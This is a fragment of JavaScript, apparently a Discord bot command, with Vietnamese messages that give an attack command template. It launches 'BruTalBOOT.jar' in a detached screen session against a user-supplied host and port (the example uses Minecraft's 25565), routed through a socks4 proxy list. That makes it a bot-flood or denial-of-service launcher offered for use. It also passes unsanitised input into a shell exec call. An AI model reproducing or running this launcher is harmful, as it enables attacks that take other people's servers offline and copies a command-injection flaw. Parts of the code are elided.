...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;bypasshub 1.1.1.1 25565 47`")
...
exec(`screen -d -m timeout 60 java -jar BruTalBOOT.jar ${host}:${port} 13 1 ${protocol} 1000 1000 1000 100 10 proxies.txt socks4`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
